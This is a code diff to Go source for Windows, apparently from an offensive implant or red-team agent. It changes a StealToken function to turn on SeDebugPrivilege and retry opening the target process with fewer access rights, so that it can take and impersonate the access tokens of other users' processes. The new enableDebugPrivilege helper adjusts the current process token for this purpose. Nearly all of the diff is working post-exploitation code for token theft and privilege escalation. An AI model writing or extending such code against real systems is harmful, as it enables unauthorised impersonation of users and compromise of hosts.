@@ -70,10 +70,21 @@ type TOKEN_USER struct {
 
 // StealToken steals a token from a running process and impersonates it.
 func StealToken(pid uint32) ([]byte, error) {
-	// Open target process
-	hProcess, _, err := pOpenProcess2.Call(PROCESS_QUERY_INFO, 0, uintptr(pid))
+	// Enable SeDebugPrivilege first (required to open other processes' tokens)
+	enableDebugPrivilege()
+
+	// Open target process with PROCESS_QUERY_INFORMATION
+	hProcess, _, err := pOpenProcess2.Call(
+		uintptr(0x0400|0x1000), // PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION
+		0,
+		uintptr(pid),
+	)
 	if hProcess == 0 {
-		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
+		// Try with less permissions
+		hProcess, _, err = pOpenProcess2.Call(0x1000, 0, uintptr(pid)) // PROCESS_QUERY_LIMITED_INFORMATION only
+		if hProcess == 0 {
+			return nil, fmt.Errorf("OpenProcess(%d): %v", pid, err)
+		}
 	}
 	defer syscall.CloseHandle(syscall.Handle(hProcess))
 
@@ -119,6 +130,31 @@ func RevertToken() ([]byte, error) {
 		return nil, fmt.Errorf("RevertToSelf: %w", err)
 	}
 	return []byte("[+] Reverted to original token"), nil
+}
+
+// enableDebugPrivilege enables SeDebugPrivilege on the current process token.
+// Required to open processes owned by other users (like stealing tokens).
+func enableDebugPrivilege() {
+	var hToken syscall.Handle
+	currentProcess, _ := syscall.GetCurrentProcess()
+	pOpenProcessToken.Call(uintptr(currentProcess), TOKEN_QUERY|0x0020, uintptr(unsafe.Pointer(&hToken))) // TOKEN_ADJUST_PRIVILEGES = 0x0020
+
+	if hToken == 0 {
+		return
+	}
+	defer syscall.CloseHandle(hToken)
+
+	privName, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
+	var luid LUID
+	pLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(privName)), uintptr(unsafe.Pointer(&luid)))
+
+	tp := TOKEN_PRIVILEGES{
+		PrivilegeCount: 1,
+		Privileges: [1]LUID_AND_ATTRIBUTES{
+			{Luid: luid, Attributes: SE_PRIVILEGE_ENABLED},
+		},
+	}
+	pAdjustTokenPrivileges.Call(uintptr(hToken), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
 }
 
 // MakeToken creates a new logon token with provided credentials.
